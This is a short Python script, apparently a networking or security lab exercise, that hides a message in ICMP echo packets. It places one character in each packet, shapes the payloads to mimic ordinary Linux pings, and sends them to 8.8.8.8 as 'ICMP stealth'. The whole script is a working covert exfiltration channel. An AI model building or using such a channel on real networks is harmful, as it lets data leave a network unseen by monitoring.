#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import IP, ICMP, send
import sys, os, struct, time

def build_ping_payload(char: str):
    """
    Crea un payload ICMP de 32 bytes, idéntico al de un ping Linux típico.
    - Primeros 8 bytes: timestamp simulado.
    - Posición 8: carácter secreto.
    - Resto: patrón que simula ping real.
    """
    # Primeros 8 bytes: timestamp (simulado)
    ts = int(time.time() * 1000) & 0xFFFFFFFFFFFFFFFF
    first8 = struct.pack("!Q", ts)  # 8 bytes

    # Posición 8: carácter secreto
    secret = bytes(char, "utf-8")[:1]
    filler = b"\x00" * 7              # completar 8 bytes
    secret_zone = secret + filler

    # Resto del payload: patrón incremental como ping Linux (para 32 bytes total)
    # Ya tenemos 16 bytes, necesitamos 16 más
    tail = bytes(range(0x10, 0x10 + 16))  # 0x10 a 0x1F

    return first8 + secret_zone + tail

def send_icmp_message(message, dst="8.8.8.8"):
    """
    Envía cada carácter de un mensaje como un paquete ICMP tipo 8.
    - Paquetes idénticos a ping Linux.
    - No se envía marcador de fin.
    """
    for seq, ch in enumerate(message, start=1):
        payload = build_ping_payload(ch)
        pkt = IP(dst=dst)/ICMP(type=8, seq=seq, id=os.getpid() & 0xFFFF)/payload
        pkt.show()   # Mostrar campos del paquete para evidencia
        send(pkt, verbose=0)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: sudo python3 pingv4.py \"mensaje_cifrado\"")
        sys.exit(1)

    message = sys.argv[1]
    destination = "8.8.8.8"  # define el destino aquí
    print(f"[+] Enviando mensaje oculto a {destination} usando ICMP stealth...")
    send_icmp_message(message, destination)
    print("[+] Mensaje transmitido con éxito.")
